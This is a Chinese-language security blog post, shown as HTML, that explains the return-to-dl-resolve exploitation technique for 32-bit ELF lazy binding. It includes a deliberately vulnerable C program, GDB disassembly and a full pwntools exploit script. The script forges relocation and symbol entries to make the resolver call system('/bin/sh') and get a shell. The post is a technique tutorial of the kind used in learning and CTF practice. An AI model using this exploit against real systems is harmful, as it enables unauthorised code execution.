@@ -1,0 +1,870 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="stack,exploit,return to dl-resolve," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="OK，早就想把return to dl-resolve这种方法记录一下，可是以前觉得这种方法太麻烦，不想搞，就看了下原理，而且具体构造细节有几个地方没懂，所以就耽搁了。但是觉得多掌握一种方法还是有利无害吗，所以今天得空记录一下。 利用原理其实return to dl-resolve利用的就是函数的lazy binding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用">
+<meta name="keywords" content="stack,exploit,return to dl-resolve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="return to dl-resolve">
+<meta property="og:url" content="http://yoursite.com/2016/10/25/return-to-dl-resolve/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="OK，早就想把return to dl-resolve这种方法记录一下，可是以前觉得这种方法太麻烦，不想搞，就看了下原理，而且具体构造细节有几个地方没懂，所以就耽搁了。但是觉得多掌握一种方法还是有利无害吗，所以今天得空记录一下。 利用原理其实return to dl-resolve利用的就是函数的lazy binding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/_dl_runtime_stack.PNG">
+<meta property="og:image" content="http://of38fq57s.bkt.clouddn.com/return2-dl-resolve.PNG">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="return to dl-resolve">
+<meta name="twitter:description" content="OK，早就想把return to dl-resolve这种方法记录一下，可是以前觉得这种方法太麻烦，不想搞，就看了下原理，而且具体构造细节有几个地方没懂，所以就耽搁了。但是觉得多掌握一种方法还是有利无害吗，所以今天得空记录一下。 利用原理其实return to dl-resolve利用的就是函数的lazy binding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用">
+<meta name="twitter:image" content="http://of38fq57s.bkt.clouddn.com/_dl_runtime_stack.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/25/return-to-dl-resolve/"/>
+
+
+  <title> return to dl-resolve | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                return to dl-resolve
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-10-25T02:09:07+08:00" content="2016-10-25">
+              2016-10-25
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/stack-exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">stack_exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/10/25/return-to-dl-resolve/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/10/25/return-to-dl-resolve/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>OK，早就想把return to dl-resolve这种方法记录一下，可是以前觉得这种方法太麻烦，不想搞，就看了下原理，而且具体构造细节有几个地方没懂，所以就耽搁了。但是觉得多掌握一种方法还是有利无害吗，所以今天得空记录一下。</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>其实return to dl-resolve利用的就是函数的lazy binding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用fixup()函数来获得函数的地址，并把地址写入相应reloc的r_offset字段(GOT), 然后执行解析的函数。<br>注：dl-resolve函数其实跟fixup函数实现的是相同的功能，只是在不同glibc中名字不同而已。<br><a id="more"></a><br>具体来说第一次调用一个函数的过程是这样的：</p>
+<ol>
+<li><p>跳转到对应的plt项，plt表项的具体内容如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) x/4i 0x80483f0</div><div class="line">   0x80483f0 &lt;write@plt&gt;:	    jmp    *0x804a020</div><div class="line">   0x80483f6 &lt;write@plt+6&gt;:	    push   $0x28</div><div class="line">   0x80483fb &lt;write@plt+11&gt;:	    jmp    0x8048390</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后跳转都相应got项。当然第一次调用时其got表项存放的是相应plt表项的第二条指令的地址。其实又回到了plt表项。</p>
+</li>
+<li>再把相应偏移量push后，然后跳转到PLT[0]，就是上面的第三条指令。第一次push GOT[1]，一个指向link_map结构体的指针，然后跳转到GOT[2]里面存放的地址,即_dl_runtime_resolve函数的地址。然后此函数会把解析得到的函数地址写入reloc项的r_offset字段。最后在_dl_runtime_resolve返回后跳到了相应的函数体执行。PLT[0]存放的内容如下：<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/2i 0x8048390</div><div class="line">   0x8048390:	pushl  0x804a004</div><div class="line">   0x8048396:	jmp    *0x804a008</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>其实就是函数参数先压栈，然后执行了_dl_runtime_resolve(*link_map, rel_offset)函数。</p>
+<p>具体_dl_runtime_resolve函数的具体执行过程如下：</p>
+<ol>
+<li>计算函数的reloc entry。<br> Elf32_Rel * reloc = JMPREL + reloc_offset;</li>
+<li>计算函数的symtab entry。<br> Elf32_Sym * sym = &amp;SYMTAB[ ELF32_R_SYM (reloc-&gt;r_info) ];</li>
+<li>security check<br> assert (ELF32_R_TYPE(reloc-&gt;r_info) == R_386_JMP_SLOT);</li>
+<li>计算函数名称在dynstr表中的偏移。<br> name = STRTAB + sym-&gt;st_name;</li>
+<li>函数地址写入相应的项，堆栈调整，执行函数。</li>
+</ol>
+<p>由此，攻击思路就是提供一个很大的数rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数并调用了。</p>
+<h2 id="利用举例"><a href="#利用举例" class="headerlink" title="利用举例"></a>利用举例</h2><p>我还是用一个<a href="https://github.com/wolfzhang888/pwn_learning/blob/master/stack_skills/dl-resolve" target="_blank" rel="external">例子</a>考说明一下吧。以下是相应源码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf[<span class="number">0x88</span>];</div><div class="line"></div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  vulnerable_function();</div><div class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>以下是exploit：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">0</span></div><div class="line"><span class="keyword">if</span> debug:</div><div class="line">    context.log_level = <span class="string">'debug'</span></div><div class="line">    p = process(<span class="string">'./dl-resolve'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'192.168.175.156'</span>, <span class="number">10000</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./dl-resolve'</span>)</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">write_got = elf.got[<span class="string">'write'</span>]</div><div class="line"></div><div class="line">vuln = <span class="number">0x0804844b</span></div><div class="line">bss_addr = <span class="number">0x804a024</span></div><div class="line">base_stage = bss_addr + <span class="number">0x400</span></div><div class="line">pop3_ret = <span class="number">0x8048509</span></div><div class="line">pop_ebp_ret = <span class="number">0x804850b</span></div><div class="line">leave_ret = <span class="number">0x80483b8</span></div><div class="line">plt_resolve = <span class="number">0x8048300</span></div><div class="line"></div><div class="line">payload1  = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'b'</span> * <span class="number">0x4</span> + p32(read_plt) + p32(pop3_ret)</div><div class="line">payload1 += p32(<span class="number">0</span>) + p32(base_stage) +p32(<span class="number">100</span>) + p32(pop_ebp_ret)</div><div class="line">payload1 += p32(base_stage) + p32(leave_ret) </div><div class="line">p.sendline(payload1)</div><div class="line"></div><div class="line">rel_plt = <span class="number">0x80482b0</span></div><div class="line">dynsym_addr = <span class="number">0x80481cc</span></div><div class="line">dynstr_addr = <span class="number">0x804822c</span></div><div class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt  <span class="comment">#seems like reloc no need to be align, (I've tried many number)</span></div><div class="line">fake_sym = base_stage + <span class="number">36</span>		    <span class="comment">#in the place of '28' can be any number(&gt;=20)</span></div><div class="line">align = <span class="number">0x10</span> - ((fake_sym - dynsym_addr) % <span class="number">0x10</span>)   <span class="comment">#but sym's necessary</span></div><div class="line">fake_sym = fake_sym + align</div><div class="line">index_dynsym = (fake_sym - dynsym_addr) / <span class="number">0x10</span></div><div class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></div><div class="line">fake_reloc = p32(write_got) + p32(r_info)</div><div class="line">st_name = (fake_sym + <span class="number">16</span>) - dynstr_addr</div><div class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</div><div class="line"></div><div class="line">payload2 = <span class="string">'c'</span> * <span class="number">4</span> + p32(plt_resolve) + p32(index_offset) + p32(<span class="number">0xdeadbeef</span>)</div><div class="line">payload2 += p32(base_stage + <span class="number">80</span>) + <span class="string">'e'</span> * <span class="number">8</span> + fake_reloc + <span class="string">'f'</span> *align</div><div class="line">payload2 += fake_sym + <span class="string">'system\x00'</span></div><div class="line">payload2 = payload2.ljust(<span class="number">80</span>, <span class="string">'a'</span>)</div><div class="line">payload2 += <span class="string">'/bin/sh\x00'</span></div><div class="line">payload2 = payload2.ljust(<span class="number">100</span>, <span class="string">'a'</span>)</div><div class="line"></div><div class="line">p.send(payload2)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>payload1是为了把伪造条目写到相应区域并把栈调整到该区域，因为执行system函数所需的参数在此区域。payload2主要是为了让_dl_runtime_resolve函数解析system函数并执行。<br>其实关键还得看_dl_runtime_resolve函数执行时栈的情况, _dl_runtime_resolve的相应汇编如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">(gdb) x/11i _dl_runtime_resolve </div><div class="line">   0xb7ff1150 &lt;_dl_runtime_resolve&gt;:    push   %eax</div><div class="line">   0xb7ff1151 &lt;_dl_runtime_resolve+1&gt;:  push   %ecx</div><div class="line">   0xb7ff1152 &lt;_dl_runtime_resolve+2&gt;:  push   %edx</div><div class="line">   0xb7ff1153 &lt;_dl_runtime_resolve+3&gt;:  mov    0x10(%esp),%edx</div><div class="line">   0xb7ff1157 &lt;_dl_runtime_resolve+7&gt;:  mov    0xc(%esp),%eax</div><div class="line">   0xb7ff115b &lt;_dl_runtime_resolve+11&gt;: call   0xb7feab30 &lt;_dl_fixup&gt;</div><div class="line">   0xb7ff1160 &lt;_dl_runtime_resolve+16&gt;: pop    %edx</div><div class="line">   0xb7ff1161 &lt;_dl_runtime_resolve+17&gt;: mov    (%esp),%ecx</div><div class="line">   0xb7ff1164 &lt;_dl_runtime_resolve+20&gt;: mov    %eax,(%esp)</div><div class="line">   0xb7ff1167 &lt;_dl_runtime_resolve+23&gt;: mov    0x4(%esp),%eax</div><div class="line">   0xb7ff116b &lt;_dl_runtime_resolve+27&gt;: ret    $0xc</div></pre></td></tr></table></figure></p>
+<p>在执行_dl_runtime_resolve + 27 时时栈的情况应该是下面这样的：<br><img src="http://of38fq57s.bkt.clouddn.com/_dl_runtime_stack.PNG"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">|fun's addr|</div><div class="line">|eax.......|</div><div class="line">|link_map..|</div><div class="line">|offset....|</div><div class="line">|ret.......|</div><div class="line">|arg.......|</div><div class="line">|arg.......|</div><div class="line">|..........|</div></pre></td></tr></table></figure></p>
+<p>所以当ret 0xc时就去执行了相应的函数了。以上会执行system函数，最终获得shell。<br><img src="http://of38fq57s.bkt.clouddn.com/return2-dl-resolve.PNG"></p>
+<p>64位比32位有了些许变化。相关的结构体大小不同，函数参数也变成由寄存器传递而非栈传递。需要注意的是64位还需要泄露link_map的值，目的是将link_map+0x1c8处设为NULL，这样才能绕过相关检测。64位就不举例了，原理都差不多。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://wooyun.bystudent.com/static/drops/binary-14360.html" target="_blank" rel="external">通过ELF动态装载构造ROP链</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/stack/" rel="tag">#stack</a>
+          
+            <a href="/tags/exploit/" rel="tag">#exploit</a>
+          
+            <a href="/tags/return-to-dl-resolve/" rel="tag">#return to dl-resolve</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/21/off-by-one/" rel="next" title="off by one">
+                <i class="fa fa-chevron-left"></i> off by one
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/28/2015-32C3-CTF-smashes/" rel="prev" title="2015 32C3 CTF smashes">
+                2015 32C3 CTF smashes <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用原理"><span class="nav-number">1.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用举例"><span class="nav-number">2.</span> <span class="nav-text">利用举例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2016/10/25/return-to-dl-resolve/';
+      var disqus_title = "return to dl-resolve";
+      var disqus_url = 'http://yoursite.com/2016/10/25/return-to-dl-resolve/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
